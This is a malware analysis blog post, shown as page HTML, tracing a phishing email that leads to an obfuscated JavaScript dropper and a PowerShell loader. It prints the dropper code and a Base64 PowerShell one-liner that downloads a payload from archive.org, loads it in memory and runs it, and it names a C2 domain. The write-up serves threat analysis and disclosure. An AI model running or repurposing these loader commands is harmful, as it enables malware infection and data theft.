<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Unsophisticated Phishing Delivering Sophisticated Malware | Martin Kubeƒçka</title><meta name=keywords content="Malware Analysis,Phishing Campaign,Steganography,Katz Stealer,Remcos RAT"><meta name=description content="Deep dive analysis of an opportunistic phishing campaign delivering Katz Stealer and Remcos RAT."><meta name=author content="Martin Kubeƒçka"><link rel=canonical href=https://martinkubecka.sk/posts/2025-10-06-unsophisticated-phishing-delivering-sophisticated-malware/><link crossorigin=anonymous href=/assets/css/stylesheet.ba00c1f715cc18cbf534f1dd7be1b22fc29e5384ca42c46b68ff6c99b2b92143.css integrity="sha256-ugDB9xXMGMv1NPHde+GyL8KeU4TKQsRraP9smbK5IUM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://martinkubecka.sk/images/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://martinkubecka.sk/images/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://martinkubecka.sk/images/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://martinkubecka.sk/images/favicon/apple-touch-icon.png><link rel=mask-icon href=https://martinkubecka.sk/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Unsophisticated Phishing Delivering Sophisticated Malware"><meta property="og:description" content="Deep dive analysis of an opportunistic phishing campaign delivering Katz Stealer and Remcos RAT."><meta property="og:type" content="article"><meta property="og:url" content="https://martinkubecka.sk/posts/2025-10-06-unsophisticated-phishing-delivering-sophisticated-malware/"><meta property="og:image" content="https://martinkubecka.sk/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/icon.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-06T00:00:00+00:00"><meta property="article:modified_time" content="2025-10-06T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://martinkubecka.sk/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/icon.png"><meta name=twitter:title content="Unsophisticated Phishing Delivering Sophisticated Malware"><meta name=twitter:description content="Deep dive analysis of an opportunistic phishing campaign delivering Katz Stealer and Remcos RAT."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://martinkubecka.sk/posts/"},{"@type":"ListItem","position":3,"name":"Unsophisticated Phishing Delivering Sophisticated Malware","item":"https://martinkubecka.sk/posts/2025-10-06-unsophisticated-phishing-delivering-sophisticated-malware/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Unsophisticated Phishing Delivering Sophisticated Malware","name":"Unsophisticated Phishing Delivering Sophisticated Malware","description":"Deep dive analysis of an opportunistic phishing campaign delivering Katz Stealer and Remcos RAT.","keywords":["Malware Analysis","Phishing Campaign","Steganography","Katz Stealer","Remcos RAT"],"articleBody":" Executive Summary A phishing campaign was observed delivering a staged malware chain that could potentially have led to remote access compromise. An attacker sent a phishing message from perfecttradedr@gmail.com linking to https://www.cekomng.shop/. A user who visited the site received and executed an obfuscated JavaScript dropper (Adobe873768.js). The JavaScript launched an obfuscated PowerShell downloader which retrieved an image from archive.org that contained an embedded Base64 payload. That payload was decoded and loaded in-memory as a .NET assembly. The loader invoked a method (VAI) that behaved as a flexible dropper and persistence orchestrator. The in-memory DLL matched characteristics of a Katz Stealer variant and subsequently fetched a second stage payload that unpacked into a Remcos Remote Access Trojan. The RAT ran masquerading as calc.exe, established outbound connections to cnn9001.duckdns.org, and enabled remote control and post exploitation activity.\nTechnical Analysis The analysis was conducted on Monday, September 29th, 2025, and focused on reconstructing the complete infection chain, from the initial unsophisticated phishing email to the final remote access payload execution. The following sections describe each stage of this process in detail, supported by recovered and decoded scripts, binaries, and other forensic artifacts.\nPhishing Email The malicious email under investigation was sent from Perfect Trade ALEX . Using a freely available language translation tool, the content was identified as Bosnian, Croatian or Serbian. The email text translates approximately to:\nSubject: ‚ÄúINVOICE and EUR 1‚Äù Body: ‚ÄúDear, Enclosed, without EUR1.‚Äù The email message is shown below:\nA closer look at the email header confirmed that the message originated directly from Gmail infrastructure. This means that the sender did not rely on spoofing a third party mail relay, but instead sent the email via a Gmail account. Consequently, standard authentication mechanisms (SPF and DKIM) successfully passed.\nBelow is a parsed and anonymized part of the email header:\nReceived-SPF: Pass (REDACTED: domain of perfecttradedr@gmail.com designates 2a00:1450:4864:20::62d as permitted sender) identity=mailfrom; client-ip=2a00:1450:4864:20::62d; receiver=REDACTED; envelope-from=\"perfecttradedr@gmail.com\"; x-sender=\"perfecttradedr@gmail.com\"; x-conformance=spf_only; x-record-type=\"v=spf1\"; x-record-text=\"v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all\" . . . Authentication-Results: REDACTED; spf=Pass smtp.mailfrom=perfecttradedr@gmail.com; dkim=pass (signature verified) header.i=@gmail.com . . . Received: from mail-ej1-x62d.google.com ([IPv6:2a00:1450:4864:20::62d]) by REDACTED with ESMTP/TLS/TLS_AES_256_GCM_SHA384; 29 Sep 2025 10:51:15 +0200 Received: by mail-ej1-x62d.google.com with SMTP id a640c23a62f3a-b3c2db014easo255316166b.0 for ; Mon, 29 Sep 2025 01:51:15 -0700 (PDT) . . . X-Received: by 2002:a17:907:3d9e:b0:b2b:a56f:5434 with SMTP id a640c23a62f3a-b34b644a7ccmr1738215266b.13.1759135871617; Mon, 29 Sep 2025 01:51:11 -0700 (PDT) MIME-Version: 1.0 From: Perfect Trade ALEX Date: Mon, 29 Sep 2025 09:50:58 +0100 Message-ID: ","wordCount":"3368","inLanguage":"en","image":"https://martinkubecka.sk/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/icon.png","datePublished":"2025-10-06T00:00:00Z","dateModified":"2025-10-06T00:00:00Z","author":{"@type":"Person","name":"Martin Kubeƒçka"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://martinkubecka.sk/posts/2025-10-06-unsophisticated-phishing-delivering-sophisticated-malware/"},"publisher":{"@type":"Organization","name":"Martin Kubeƒçka","logo":{"@type":"ImageObject","url":"https://martinkubecka.sk/images/favicon/favicon.ico"}}}</script></head><body id=top><script>window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://martinkubecka.sk accesskey=h title="$ cd /home/ (Alt + H)">$ cd /home/</a><div class=logo-switches></div></div><button id=menu-trigger aria-haspopup=menu aria-label="Menu Button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button><ul class="menu hidden"><li><a href=https://martinkubecka.sk/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://martinkubecka.sk/security-advisories/ title="Security Advisories"><span>Security Advisories</span></a></li><li><a href=https://martinkubecka.sk/library/ title=Library><span>Library</span></a></li><li><a href=https://martinkubecka.sk/about/ title=About><span>About</span></a></li><li><a href=https://martinkubecka.sk/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://openguards.martinkubecka.sk/ title=OpenGuards><span>OpenGuards</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://martinkubecka.sk>Home</a>&nbsp;¬ª&nbsp;<a href=https://martinkubecka.sk/posts/>Posts</a></div><h1 class=post-title>Unsophisticated Phishing Delivering Sophisticated Malware</h1><div class=post-description>Deep dive analysis of an opportunistic phishing campaign delivering Katz Stealer and Remcos RAT.</div><div class=post-meta><span title='2025-10-06 00:00:00 +0000 +0000'>October 6, 2025</span>&nbsp;¬∑&nbsp;16 min&nbsp;¬∑&nbsp;3368 words&nbsp;¬∑&nbsp;Martin Kubeƒçka</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#executive-summary>Executive Summary</a></li><li><a href=#technical-analysis>Technical Analysis</a><ul><li><a href=#phishing-email>Phishing Email</a></li><li><a href=#chain-of-infection>Chain of Infection</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#indicators-of-compromise-iocs>Indicators of Compromise (IoCs)</a></li><li><a href=#appendices>Appendices</a><ul><li><a href=#appendix-a--cekomngshop-whois-record>Appendix A : CEKOMNG.SHOP WHOIS Record</a></li><li><a href=#appendix-b--pdb-file-presence-verification>Appendix B : PDB File Presence Verification</a></li></ul></li><li><a href=#references>References</a></li></ul></nav></div></details></div><div class=post-content><p><img loading=lazy src=/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/icon.png alt></p><hr><h2 id=executive-summary>Executive Summary<a hidden class=anchor aria-hidden=true href=#executive-summary>#</a></h2><p>A phishing campaign was observed delivering a staged malware chain that could potentially have led to remote access compromise. An attacker sent a phishing message from <code>perfecttradedr@gmail.com</code> linking to <code>https://www.cekomng.shop/</code>. A user who visited the site received and executed an obfuscated JavaScript dropper (<code>Adobe873768.js</code>). The JavaScript launched an obfuscated PowerShell downloader which retrieved an image from <code>archive.org</code> that contained an embedded Base64 payload. That payload was decoded and loaded in-memory as a .NET assembly. The loader invoked a method (<code>VAI</code>) that behaved as a flexible dropper and persistence orchestrator. The in-memory DLL matched characteristics of a <strong>Katz Stealer</strong> variant and subsequently fetched a second stage payload that unpacked into a <strong>Remcos Remote Access Trojan</strong>. The RAT ran masquerading as <code>calc.exe</code>, established outbound connections to <code>cnn9001.duckdns.org</code>, and enabled remote control and post exploitation activity.</p><hr><h2 id=technical-analysis>Technical Analysis<a hidden class=anchor aria-hidden=true href=#technical-analysis>#</a></h2><p>The analysis was conducted on Monday, September 29th, 2025, and focused on reconstructing the complete infection chain, from the initial unsophisticated phishing email to the final remote access payload execution. The following sections describe each stage of this process in detail, supported by recovered and decoded scripts, binaries, and other forensic artifacts.</p><h3 id=phishing-email>Phishing Email<a hidden class=anchor aria-hidden=true href=#phishing-email>#</a></h3><p>The malicious email under investigation was sent from <code>Perfect Trade ALEX &lt;perfecttradedr@gmail.com></code>. Using a freely available language translation tool, the content was identified as <strong>Bosnian</strong>, <strong>Croatian</strong> or <strong>Serbian</strong>. The email text translates approximately to:</p><ul><li><strong>Subject:</strong> &ldquo;INVOICE and EUR 1&rdquo;</li><li><strong>Body:</strong> &ldquo;Dear, Enclosed, without EUR1.&rdquo;</li></ul><p>The email message is shown below:</p><p><img loading=lazy src=/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/1_Email_Sample.png alt title="Malicious Email Message"></p><p>A closer look at the email header confirmed that the message originated directly from <strong>Gmail infrastructure</strong>. This means that the sender did not rely on spoofing a third party mail relay, but instead sent the email via a Gmail account. Consequently, standard authentication mechanisms (SPF and DKIM) successfully passed.</p><p>Below is a parsed and anonymized part of the email header:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Received-SPF: Pass (REDACTED: domain of
</span></span><span class=line><span class=cl>  perfecttradedr@gmail.com designates 2a00:1450:4864:20::62d as
</span></span><span class=line><span class=cl>  permitted sender) identity=mailfrom;
</span></span><span class=line><span class=cl>  client-ip=2a00:1450:4864:20::62d; receiver=REDACTED;
</span></span><span class=line><span class=cl>  envelope-from=&#34;perfecttradedr@gmail.com&#34;;
</span></span><span class=line><span class=cl>  x-sender=&#34;perfecttradedr@gmail.com&#34;; x-conformance=spf_only;
</span></span><span class=line><span class=cl>  x-record-type=&#34;v=spf1&#34;; x-record-text=&#34;v=spf1
</span></span><span class=line><span class=cl>  ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36
</span></span><span class=line><span class=cl>  ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36
</span></span><span class=line><span class=cl>  ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all&#34;
</span></span><span class=line><span class=cl>. . .
</span></span><span class=line><span class=cl>Authentication-Results: REDACTED; spf=Pass smtp.mailfrom=perfecttradedr@gmail.com; dkim=pass (signature verified) header.i=@gmail.com
</span></span><span class=line><span class=cl>. . .
</span></span><span class=line><span class=cl>Received: from mail-ej1-x62d.google.com ([IPv6:2a00:1450:4864:20::62d])
</span></span><span class=line><span class=cl>  by REDACTED with ESMTP/TLS/TLS_AES_256_GCM_SHA384; 29 Sep 2025 10:51:15 +0200
</span></span><span class=line><span class=cl>Received: by mail-ej1-x62d.google.com with SMTP id a640c23a62f3a-b3c2db014easo255316166b.0
</span></span><span class=line><span class=cl>        for &lt;REDACTED&gt;; Mon, 29 Sep 2025 01:51:15 -0700 (PDT)
</span></span><span class=line><span class=cl>. . .
</span></span><span class=line><span class=cl>X-Received: by 2002:a17:907:3d9e:b0:b2b:a56f:5434 with SMTP id
</span></span><span class=line><span class=cl> a640c23a62f3a-b34b644a7ccmr1738215266b.13.1759135871617; Mon, 29 Sep 2025
</span></span><span class=line><span class=cl> 01:51:11 -0700 (PDT)
</span></span><span class=line><span class=cl>MIME-Version: 1.0
</span></span><span class=line><span class=cl>From: Perfect Trade ALEX &lt;perfecttradedr@gmail.com&gt;
</span></span><span class=line><span class=cl>Date: Mon, 29 Sep 2025 09:50:58 +0100
</span></span><span class=line><span class=cl>Message-ID: &lt;CAL=BSPbHW+E4OrHkZHUeZuEnAJBS7V0oUKuRtZ=KYXN3OdxgvA@mail.gmail.com&gt;
</span></span><span class=line><span class=cl>Subject: =?UTF-8?Q?RA=C4=8CUN_i_EUR_1?=
</span></span><span class=line><span class=cl>To: Perfect Trade ALEX &lt;perfecttradedr@gmail.com&gt;
</span></span><span class=line><span class=cl>. . .
</span></span></code></pre></div><p>The analyzed email sample was relayed through Gmail&rsquo;s legitimate infrastructure, which allowed it to pass standard authentication checks, thereby reducing suspicion from automated filters. A closer look at the message body reveals a signature block attributed to <strong>Miroslav Svitlica</strong> of <em>AG Infoplan d.o.o. Nik≈°iƒá</em>, which did not align with the displayed sender identity <strong>Perfect Trade ALEX</strong>. This mismatch between the visible sender address and the individual referenced in the body is a common indicator of fraudulent intent and suggests the email was crafted to impersonate a legitimate business contact.</p><p>Overall, the analyzed email sample is very <strong>unsophisticated</strong>. It lacked personalization, contextual tailoring, or any effort to convincingly mimic a real business correspondence. This strongly suggests that the campaign was not a targeted spearphishing attempt, but rather the work of an <strong>opportunistic</strong> attacker.</p><hr><h3 id=chain-of-infection>Chain of Infection<a hidden class=anchor aria-hidden=true href=#chain-of-infection>#</a></h3><h4 id=stage-0--initial-delivery-and-drive-by-staged-download>Stage 0 : Initial delivery and drive-by (staged) download<a hidden class=anchor aria-hidden=true href=#stage-0--initial-delivery-and-drive-by-staged-download>#</a></h4><p>The image embedded under the email body, was designed to mimic an attachment in the Gmail client, but in reality it pointed to <code>https://www.cekomng.shop/</code>. Clicking the image, or visiting that URL directly, caused a JavaScript file to be downloaded automatically with the filename <code>Adobe873768.js</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ file Adobe873768.js 
</span></span><span class=line><span class=cl>Adobe873768.js: JavaScript source, Unicode text, UTF-8 text, with very long lines (15744), with CRLF line terminators
</span></span></code></pre></div><h4 id=stage-1--javascript-dropper>Stage 1 : JavaScript Dropper<a hidden class=anchor aria-hidden=true href=#stage-1--javascript-dropper>#</a></h4><p>Below is an abbreviated contents of the obfuscated JavaScript (comments are in the original Spanish / Portuguese language). The script is intended to run under <strong>Windows Script Host</strong> (WScript). It constructs <strong>COM</strong> objects (ActiveX) <a href=#references>[1]</a> and uses <strong>WMI</strong> (<code>winmgmts</code>) <a href=#references>[2]</a> to spawn a hidden process, avoiding any visible console or window on execution.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>(</span><span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>function</span> <span class=nx>unsquareable</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>this</span><span class=p>.</span><span class=nx>Antirio</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ActiveXObject</span><span class=p>(</span><span class=s2>&#34;Scripting.FileSystemObject&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=c1>// pega a pasta do script
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>this</span><span class=p>.</span><span class=nx>playboys</span> <span class=o>=</span> <span class=k>this</span><span class=p>.</span><span class=nx>Antirio</span><span class=p>.</span><span class=nx>GetParentFolderName</span><span class=p>(</span><span class=nx>WScript</span><span class=p>.</span><span class=nx>ScriptFullName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>this</span><span class=p>.</span><span class=nx>pimaric</span> <span class=o>=</span> <span class=s2>&#34;J‚§±ﬁ∑‚∑üü¶ù·ñà‡£æ’å≈´·¶¥›∂∆∫‚è©‚ÇÉﬂõ·®±G‚§±ﬁ∑‚∑üü¶ù·ñà‡£æ’å≈´·¶¥›∂∆∫‚è©‚ÇÉﬂõ·®±N . . .&#34;</span><span class=p>.</span><span class=nx>split</span><span class=p>(</span><span class=s2>&#34;‚§±ﬁ∑‚∑üü¶ù·ñà‡£æ’å≈´·¶¥›∂∆∫‚è©‚ÇÉﬂõ·®±&#34;</span><span class=p>).</span><span class=nx>join</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>unsquareable</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>_buildCommand</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>chiromancer</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;d‡∞ª‚≤î‚êõ—Çüîª‡≤§œô·øß‡•î·ΩÖ⁄Æ‚ÄÅ‚πÜ·Éßpd‡∞ª‚≤î‚êõ—Çüîª‡≤§œô·øß‡•î·ΩÖ⁄Æ‚ÄÅ‚πÜ·Éßod‡∞ª‚≤î‚êõ—Ç . . . (&#39;&#34;</span> <span class=o>+</span> <span class=k>this</span><span class=p>.</span><span class=nx>pimaric</span> <span class=o>+</span> <span class=s2>&#34;&#39;d‡∞ª‚≤î‚êõ—Çüîª‡≤§œô·øß‡•î·ΩÖ⁄Æ‚ÄÅ‚πÜ·Éß)) &#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;d‡∞ª‚≤î‚êõ—Çüîª‡≤§œô·øß‡•î·ΩÖ⁄Æ‚ÄÅ‚πÜ·Éß| . . .&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nx>chiromancer</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>).</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/d‡∞ª‚≤î‚êõ—Çüîª‡≤§œô·øß‡•î·ΩÖ⁄Æ‚ÄÅ‚πÜ·Éß/g</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>unsquareable</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>run</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>schedule</span> <span class=o>=</span> <span class=k>this</span><span class=p>.</span><span class=nx>_buildCommand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>paraelectric</span> <span class=o>=</span> <span class=nx>GetObject</span><span class=p>(</span><span class=s2>&#34;winmgmts:root\\cimv2&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>dendrochemical</span> <span class=o>=</span> <span class=nx>paraelectric</span><span class=p>.</span><span class=nx>Get</span><span class=p>(</span><span class=s2>&#34;Win32_Process&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>morosoph</span> <span class=o>=</span> <span class=nx>paraelectric</span><span class=p>.</span><span class=nx>Get</span><span class=p>(</span><span class=s2>&#34;Win32_ProcessStartup&#34;</span><span class=p>).</span><span class=nx>SpawnInstance_</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nx>morosoph</span><span class=p>.</span><span class=nx>ShowWindow</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// 0 = oculto
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>            <span class=c1>// aqui uso a pasta do script, em vez de null
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=kd>var</span> <span class=nx>cholelithic</span> <span class=o>=</span> <span class=nx>dendrochemical</span><span class=p>.</span><span class=nx>Create</span><span class=p>(</span><span class=nx>schedule</span><span class=p>,</span> <span class=k>this</span><span class=p>.</span><span class=nx>playboys</span><span class=p>,</span> <span class=nx>morosoph</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>cholelithic</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// sucesso
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// erro
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=k>new</span> <span class=nx>unsquareable</span><span class=p>()).</span><span class=nx>run</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>})();</span>
</span></span></code></pre></div><p>The script stores a long, obfuscated string in <code>this.pimaric</code> property. That string contains the actual payload data with a recurring, unusual Unicode sequence used as a separator. The script reconstructs a Base64 string by removing those separator tokens. An array (<code>chiromancer</code>) contains numerous command fragments also broken by a different repeating Unicode separator. The code joins these fragments with <code>this.pimaric</code> property and strips the separator to produce a final command string named <code>schedule</code>. When reconstructed, the <code>schedule</code> variable is a PowerShell one-liner which decodes an embedded Base64 string, and then using <code>Invoke-Expression</code> <a href=#references>[3]</a> on the decoded string.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span> <span class=n>-NoProfile</span> <span class=n>-WindowStyle</span> <span class=n>Hidden</span> <span class=n>-Command</span> <span class=s2>&#34;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&#39;JGNsaWVudE9iaiA9IE5ldy1PYmplY3QgTmV0LldlYkNsaWVudDsgJGNsaWVudE9iai5FbmNvZGluZyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjg7ICRudWxsID0gKCRjbGllbnRPYmouRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9hcmNoaXZlLm9yZy9kb3dubG9hZC9vcHRpbWl6ZWRfbXNpX3Byb193aXRoX2I2NF8yMDI1MDkvb3B0aW1pemVkX01TSV9QUk9fd2l0aF9iNjQucG5nJykgLW1hdGNoICdCYXNlU3RhcnQtKC4qPyktQmFzZUVuZCcpOyRkYXRhQmxvY2sgPSAkbWF0Y2hlc1sxXTskbG9hZGVkQXNtID0gW1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkZGF0YUJsb2NrKSk7JGlucHV0QXJnID0gJz09Z2FNNW1ieDVXUUk5U1pzbG1admtHY2g5U2J2Tm1MdWxXWXlSR2JsaFhhdzl5TDZNSGMwUkhhJzskY2xhc3NSZWYgPSAkbG9hZGVkQXNtLkdldFR5cGUoJ0NsYXNzTGlicmFyeTEuSG9tZScpOyRtZXRob2RSZWYgPSAkY2xhc3NSZWYuR2V0TWV0aG9kKCdWQUknKTskbWV0aG9kUmVmLkludm9rZSgkbnVsbCwgW29iamVjdFtdXUAoJGlucHV0QXJnLCcnLCdDOlxVc2Vyc1xQdWJsaWNcRG93bmxvYWRzXCcsJ05hbWVfRmlsZScsJ2NhbGMnLCcxJywnY2FsYycsJycsJ1VSTCcsJ0M6XFVzZXJzXFB1YmxpY1xEb3dubG9hZHNcJywnTmFtZV9GaWxlJywnanMnLCcxJywnJywnVGFza19OYW1lJywnMCcsJ3N0YXJ0dXBfb25zdGFydCcpKTs=&#39;)) | Invoke-Expression&#34;</span>
</span></span></code></pre></div><h4 id=stage-2--powershell-downloader--loader>Stage 2 : PowerShell Downloader / Loader<a hidden class=anchor aria-hidden=true href=#stage-2--powershell-downloader--loader>#</a></h4><p>Decoding the Base64 string (the payload originally stored in <code>this.pimaric</code>) reveals a PowerShell that creates a <code>Net.WebClient</code>, downloads a file from the <strong>Internet Archive</strong> (referenced as <code>optimized_MSI_PRO_with_b64.png</code>), extracts a Base64 block delimited by <code>BaseStart-</code> and <code>-BaseEnd</code> using a regex, decodes that block to bytes, and then loads those bytes as a .NET assembly in memory via <code>[Reflection.Assembly]::Load([Convert]::FromBase64String(...))</code> <a href=#references>[4]</a>. The script then uses reflection to get type <code>ClassLibrary1.Home</code>, method <code>VAI</code>, and invokes it as a method (target is <code>$null</code>) with a 17 element <code>object[]</code> parameter array.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$clientObj</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$clientObj</span><span class=p>.</span><span class=py>Encoding</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=vm>$null</span> <span class=p>=</span> <span class=p>(</span><span class=nv>$clientObj</span><span class=p>.</span><span class=py>DownloadString</span><span class=p>(</span><span class=s1>&#39;http://archive.org/download/optimized_msi_pro_with_b64_202509/optimized_MSI_PRO_with_b64.png&#39;</span><span class=p>)</span> <span class=o>-match</span> <span class=s1>&#39;BaseStart-(.*?)-BaseEnd&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$dataBlock</span> <span class=p>=</span> <span class=nv>$matches</span><span class=p>[</span><span class=mf>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$loadedAsm</span> <span class=p>=</span> <span class=p>[</span><span class=no>Reflection.Assembly</span><span class=p>]::</span><span class=n>Load</span><span class=p>([</span><span class=no>Convert</span><span class=p>]::</span><span class=n>FromBase64String</span><span class=p>(</span><span class=nv>$dataBlock</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$inputArg</span> <span class=p>=</span> <span class=s1>&#39;==gaM5mbx5WQI9SZslmZvkGch9SbvNmLulWYyRGblhXaw9yL6MHc0RHa&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$classRef</span> <span class=p>=</span> <span class=nv>$loadedAsm</span><span class=p>.</span><span class=py>GetType</span><span class=p>(</span><span class=s1>&#39;ClassLibrary1.Home&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$methodRef</span> <span class=p>=</span> <span class=nv>$classRef</span><span class=p>.</span><span class=py>GetMethod</span><span class=p>(</span><span class=s1>&#39;VAI&#39;</span><span class=p>);</span>
